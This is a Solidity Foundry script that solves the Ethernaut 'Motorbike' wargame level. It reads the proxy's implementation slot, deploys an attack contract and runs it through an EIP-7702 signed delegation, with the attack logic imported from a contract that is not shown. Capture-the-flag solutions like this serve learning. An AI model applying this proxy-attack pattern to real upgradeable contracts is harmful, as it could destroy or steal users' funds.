// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {Vm} from "forge-std/Vm.sol";
import {console} from "forge-std/console.sol";
import {MotorbikeAttack7702} from "../src/MotorbikeAttack7702.sol";

contract Solve is Script {
    address constant ETHERNAUT_ADDRESS = 0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6;
    address constant MOTORBIKE_LEVEL_ADDRESS = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;

    function run() external {
        uint256 mainPrivateKey = vm.envUint("MAIN_PRIVATE_KEY");
        uint256 secPrivateKey = vm.envUint("SEC_PRIVATE_KEY");
        address mainEoa = vm.addr(mainPrivateKey);

        // --- Create level instance ---
        vm.recordLogs();
        vm.broadcast(mainPrivateKey);

        (bool success,) = ETHERNAUT_ADDRESS.call(
            abi.encodeWithSignature("createLevelInstance(address)", MOTORBIKE_LEVEL_ADDRESS)
        );
        require(success, "Failed to create level instance");

        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 topic = keccak256("LevelInstanceCreatedLog(address,address,address)");
        address instance;

        for (uint i = 0; i < logs.length; i++) {
            if (logs[i].topics[0] == topic) {
                instance = address(uint160(uint256(logs[i].topics[2])));
                break;
            }
        }
        require(instance != address(0), "Instance not found in logs");

        console.log("Instance address:", instance);

        // --- Read Engine implementation from instance storage ---
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 rawEngine = vm.load(instance, implSlot);
        address engine = address(uint160(uint256(rawEngine)));

        console.log("Engine address:", engine);

        // --- Deploy attack contract to be used as code template ---
        vm.broadcast(mainPrivateKey);
        MotorbikeAttack7702 attacker = new MotorbikeAttack7702();
        console.log("Attacker logic contract deployed at:", address(attacker));

        // --- Prepare EIP-7702 Delegation ---
        Vm.SignedDelegation memory signedDelegation = vm.signDelegation(address(attacker), mainPrivateKey);

        // --- Execute Attack via Delegated EOA ---
        // 3. Switch to the secondary EOA to broadcast the transaction
        vm.broadcast(secPrivateKey);

        // 4. Attach the signed delegation to the next call
        vm.attachDelegation(signedDelegation);

        // 5. Call the MAIN EOA's address. The EVM will execute this call using the attacker's code
        // This is a low-level call because we are calling an address that doesn't have this function in its code permanently
        (bool attackSuccess, ) = vm.addr(mainPrivateKey).call(
            abi.encodeWithSignature("attack(address,address,address)", engine, address(attacker), mainEoa)
        );
        require(attackSuccess, "Attack call failed");

        // --- Submit level ---
        vm.broadcast(mainPrivateKey);
        (bool submitSuccess,) = ETHERNAUT_ADDRESS.call(
            abi.encodeWithSignature("submitLevelInstance(address)", instance)
        );
        require(submitSuccess, "Failed to submit level instance");
    }
}
